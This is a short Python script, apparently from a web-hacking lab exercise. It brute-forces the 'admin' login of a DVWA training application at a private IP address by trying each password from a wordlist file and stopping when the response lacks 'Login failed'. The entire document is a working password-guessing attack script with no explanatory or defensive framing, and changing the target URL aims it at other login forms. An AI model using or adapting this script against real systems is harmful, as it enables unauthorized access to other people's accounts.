#!/usr/bin/env python

import requests

target_url = "http://10.0.2.27/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}


with open("passwords.txt", "r") as password_list:
    for password in password_list:
        data_dict["password"] = password.strip()
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode("utf-8"):
            print("[+] Got the password :) \nPassword is: " + password)
            exit()

print("[-] Could not get the password. :(")
